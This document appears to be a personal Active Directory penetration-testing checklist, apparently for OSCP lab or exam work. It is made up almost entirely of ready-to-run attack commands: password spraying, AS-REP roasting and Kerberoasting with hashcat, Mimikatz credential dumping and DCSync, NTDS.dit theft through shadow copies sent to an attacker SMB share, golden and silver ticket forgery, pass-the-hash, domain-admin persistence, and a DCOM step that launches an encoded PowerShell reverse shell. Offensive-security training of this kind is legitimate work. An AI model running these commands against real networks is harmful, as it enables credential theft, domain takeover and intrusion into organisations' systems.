
### Have open while you do the AD section
- https://wadcoms.github.io/#+No%20Creds+Enumeration
- https://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest_ad_dark_2022_04.svg
# Enumeration
- [ ] Same steps as enum_checklist
- [ ] scan port 139 and 445 for smb vulnerabilities
```
nmap --script=smb-vuln* -p 139,445 192.168.xxx.xxx
```

# Have potential usernames?
- [ ] Enumerate port 88 *Kerberos* to check
```
nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm=<Domain>,userdb=users.txt 192.168.xxx.xxx
```

# Have a username?
- [ ] Check policy if you have a user's credentials. If no cooldown, rockyou that shit
```
cme 192.168.xxx.xxx -u 'user' -p 'password' --pass-pol
```
- [ ] Use list of *all* passwords -  if you trigger lockout then revert machines 
```
nxc smb 192.168.xxx.xxx -u user -p password.txt
```
- [ ] ASREPRoast the user
```
impacket-GetNPUsers -dc-ip 192.168.210.70 -request -outputfile hashes.asreproast corp.com/pete
```
- [ ] Crack the ASREPRoast if successful
```
sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```
# Have usernames and passwords but no accounts?
- [ ] Netexec the usernames and passwords - only works for short lists due to lockouts
```
nxc smb 192.168.1.101 -u usernames.txt -p password.txt
```

# Found a new password?
- [ ] Netexec the usernames with that password - only works for short lists due to lockouts
```
nxc smb 192.168.1.101 -u usernames.txt -p 'password'
```
# Have a new users' credentials?
- [ ] Try to log in with RDP
```
xfreerdp /u:user /d:oscp.exam /p:password /v:192.168.xxx.xxx
```
- [ ] Try to log in with winrm
```
evil-winrm -i 192.168.244.96 -u apache -p 'New2Era4.!'
```
- [ ] Try to log in with impacket psexec
```
impacket-psexec oscp.exam/user@192.168.xxx.xxx
```
- [ ] Go through privesc sheet
- [ ] Bloodhound/Sharphound the user
- [ ] Double check you enumerated SMB Shares
```
crackmapexec smb 192.168.xxx.xxx -u user -p password --shares
```
### Manual enumeration
- [ ] Get all users
```
net user /domain
```
- [ ] Get information about a specific user
```
net user jeffadmin /domain
```
- [ ] Get all groups in the domain
```
net group /domain
```
- [ ] Enum computer objects in the domain
```
Get-NetComputer
```
- [ ] Get OS and version of each computer - potential OS exploits
```
Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion
```
- [ ] Find computers where the current user has local admin access
```
Find-LocalAdminAccess
```
### Kerberoast
- [ ] Kerberoast from kali
```
sudo impacket-GetUserSPNs -request -dc-ip 192.168.xxx.xxx oscp.exam/user
```
- [ ] Kerberoast from windows
```
iwr -uri http://192.168.xxx.xxx/windows-privesc-check2.exe -Outfile windows-privesc-check2.exe

.\Rubeus.exe kerberoast /outfile:hashes.kerberoast

sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force #crack the hashes
```

## BLOODHOUND
- [ ] SharpHound/BloodHound Windows
```
iwr -uri http://192.168.xxx.xxx/SharpHound.ps1 -Outfile SharpHound.ps1

.\Rubeus.exe kerberoast /outfile:hashes.kerberoast

sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force #crack the hashes
```
- [ ] SharpHound/BloodHound remotely from kali
```
pip install bloodhound;
bloodhound-python -d oscp.exam -u user -p password -gc 192.168.xxx.xxx -c all
```
- [ ] Ingest into Bloodhound
```
curl -L https://ghst.ly/getbhce | sudo docker-compose -f - up

http://localhost:8080/ui/login

MATCH (m:Computer) RETURN m # into cypher to query all computers
MATCH (m:User) RETURN m # into cypher to query all users
MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p # get all sessions

# check pre bu
```
- [ ] [Bomb ass guide for bloodhound community](https://m4lwhere.medium.com/the-ultimate-guide-for-bloodhound-community-edition-bhce-80b574595acf)
- [ ] Nuke everything and restart if you see data
```
docker-compose down -v

docker-compose pull

docker-compose up
```
- [ ] Look at entire network holistically in graph
- [ ] Mark owned objects as they get owned (should say pwned smh)
### Cyphers
- [ ] Query all computers
```
MATCH (m:Computer) RETURN m
```
- [ ] Query all users
```
MATCH (m:User) RETURN m
```
- [ ] Unconstrained Delegation (allows designated services to act on behalf of users) from non domain controllers
```
MATCH (c1:Computer)-[:MemberOf*1..]->(g:Group) WHERE g.objectid ENDS WITH '-516' WITH COLLECT(c1.name) AS domainControllers MATCH (c2 {unconstraineddelegation:true}) WHERE NOT c2.name IN domainControllers RETURN c2
```
- [ ] Find users with "pass" in their description
```
MATCH p = (d:Domain)-[r:Contains*1..]->(u:User) WHERE u.description =~ '(?i).*pass.*' RETURN p
```
- [ ] List all owned objects
```
MATCH (n) WHERE "owned" in n.system_tags RETURN n
```
- [ ] Find all paths from owned to tier 0 objects (Warning, can be heavy)
```
MATCH p = allShortestPaths((o)-[*1..]->(h)) WHERE 'owned' in o.system_tags AND 'admin_tier_0' in h.system_tags RETURN p
```
- [ ] Query all users
```
MATCH (m:User) RETURN m
```
- [ ] Check all pre-built searches in cypher
- [ ] Map paths from current user to domain controller
- [ ] Map paths from current user to administrator
- [ ] Map paths from current user to computers
- [ ] Map paths from current user to other priviledged accounts

# Administrator on Windows?
- [ ] Bloodhound/Sharphound the user
- [ ] Mimikatz!
```
iwr -uri http://192.168.45.xxx/Mimikatz.exe -Outfile Mimikatz.exe

privilege::debug
token::elevate

sekurlsa::logonpasswords
lsadump::sam
lsadump::secrets
lsadump::cache
lsadump::lsa /patch

lsadump::dcsync

sekurlsa::minidump lsass.dump

sekurlsa::tickets /export
```
- [ ] Look for passwords
- [ ] Check who else is logged into a machine - we can steal their credentials if so
```
iwr -uri http://192.168.45.xxx/PsLoggedon.exe -Outfile 
.\PsLoggedon.exe \\client74
```
- [ ] Find computers where the current user has local admin access
```
Find-LocalAdminAccess
```
- [ ] Repeat privesc auto scripts like winpeas
- [ ] DC Sync from impacket
```
impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"password"@192.168.xxx.xxx
```
- [ ] Shadow copies
```
vshadow.exe -nw -p  C: # get path

copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak

reg.exe save hklm\system c:\system.bak

## after two files are saved

impacket-smbserver -smb2support test $(pwd) -username er83@R@39nfr0E4 -password kfro@59e$w$21fN$ # on kali

New-PSDrive -Name "Z" -PSProvider FileSystem -Root "\\192.168.45.xxx\er83@R@39nfr0E4" -Credential (New-Object System.Management.Automation.PSCredential("er83@R@39nfr0E4", (ConvertTo-SecureString "kfro@59e$w$21fN$" -AsPlainText -Force))) -Persist

Copy-Item -Path "C:\Users\xxx\ntds.dit.bak" -Destination "Z:\ntds.dit.bak

Copy-Item -Path "C:\Users\xxx\system.bak" -Destination "Z:\system.bak

Remove-PSDrive -Name "Z"

impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL # on kali
```

# Persistence
- [ ] Add yourself to domain admins if possible (sanity check)
```
net group "domain admins" myuser /add /domain
```
- [ ] Any cracked hashes from mimikatz? Login
- [ ] Password spraying checked?
- [ ] Privesc techniques checked?
- [ ] **Silver Ticket** - Obtained SPN password hash (NTLM), SID, and Target SPN
```
sekurlsa::logonpasswords # get hash

whoami /user # get domain sid

HTTP/web04.corp.com:80 # example SPN to access web page running on IIS

iwr -uri http://192.168.45.xxx/Mimikatz.exe -Outfile Mimikatz.exe

kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin # craft silver ticket

klist

```
- [ ] **Golden Ticket** - Obtained SPN password hash (NTLM), SID, and Target SPN
```
PsExec64.exe \\DC1 cmd.exe - no admin access to the domain controller

lsadump::lsa /patch # get krbtgt hash

whoami /user # get domain sid

kerberos::purge

HTTP/web04.corp.com:80 # example SPN to access web page running on IIS

iwr -uri http://192.168.45.xxx/Mimikatz.exe -Outfile Mimikatz.exe

kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt # craft golden ticket

klist

PsExec64.exe \\DC1 cmd.exe
```

# Lateral Movement

- [ ] Pass the hash
```
/usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73
```
- [ ] Overpass the hash -> overabuse an NTLM hash to gain full TGT to obtain TGS
```
iwr -uri http://192.168.45.xxx/Mimikatz.exe -Outfile Mimikatz.exe
.\Mimikatz.exe
sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell # run powershell as jen

/whoami # will not show user since same process token

klist

net use \\files04

klist

iwr -uri http://192.168.45.xxx/PsExec.exe \\files04 cmd
.\PsExec.exe \\files04 cmd

hostname # should show files04
```
- [ ] Pass the Ticket
```
iwr -uri http://192.168.45.xxx/Mimikatz.exe -Outfile Mimikatz.exe
.\Mimikatz.exe
sekurlsa::tickets /export
dir *.kirbi # view newly created tickets
kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi # inject ticket thru mimikatz

klist

ls \\web04\backup
```
- [ ] Attempt DCOM lateral movement technique to spawn rvsh in kali
```
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.xxx.xxx"))

dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALg...","7")
```
